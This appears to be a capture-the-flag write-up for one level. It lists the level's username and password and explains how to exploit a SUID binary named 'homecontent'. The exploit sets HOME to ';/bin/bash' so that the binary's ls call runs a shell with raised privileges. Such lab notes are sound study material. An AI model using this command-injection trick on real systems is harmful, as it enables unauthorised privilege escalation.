# username
aphrodite
# password
HPJVaqRzieKQeyyATsFv
# objective
The user ariadne knows what we keep in our HOME.
# method of solve
The homecontent SUID binary seems to be using the ls command to show us the contents of our home directory. We can OS command inject into the binary by setting a custom HOME environment variable
```
export HOME=';/bin/bash'
./homecontent
```
